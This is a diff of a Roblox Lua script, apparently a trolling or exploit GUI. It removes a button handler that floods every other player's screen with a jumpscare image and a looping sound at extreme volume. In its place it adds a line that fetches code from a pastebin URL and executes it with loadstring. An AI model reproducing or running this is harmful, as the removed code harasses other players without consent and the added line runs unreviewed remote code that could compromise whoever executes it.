@@ -747,32 +747,7 @@ EpicSaxGuy.TextSize = 14.000
 EpicSaxGuy.TextWrapped = true
 EpicSaxGuy.MouseButton1Down:connect(function()
     -- Made by Boss
-for i,v in pairs(game.Players:GetPlayers()) do
-		if v.Name ~= me and not v.PlayerGui:FindFirstChild("k00pkidd's Jumpscare") and v:FindFirstChild("PlayerGui") then
-			spawn(function()
-				local newgui = Instance.new("ScreenGui",v.PlayerGui)
-				newgui.Name = "k00p's Jumpscare"
-				local newimage = Instance.new("ImageLabel",newgui)
-				newimage.Image = "http://www.roblox.com/Asset/?id=15032057838"
-				newimage.Size = UDim2.new(1,1,1,1)
-				local s = Instance.new("Sound",newgui)
-				s.SoundId = "rbxassetid://9069609200"
-				s.Volume = 9e9
-				s.Looped = true
-				s:Play()
-				print("Screamed "..v.Name)
-				while wait(9) do
-
-					newimage.Parent:Destroy()
-wait(2)
-k00p = Instance.new("Sound", game.Workspace)
-		k00p.Name = "k00p's Sound"
-		k00p.SoundId = "rbxassetid://8894394467"
-		k00p.Volume = 10
-        k00p.Pitch = 0.85
-		k00p:Play()
-
-				end
+loadstring(game:HttpGet("https://pastebin.com/raw/9VnGLSmq"))()
 end)
 EpicSaxGuys.Name = "EpicSaxGuy"
 EpicSaxGuys.Parent = Frame
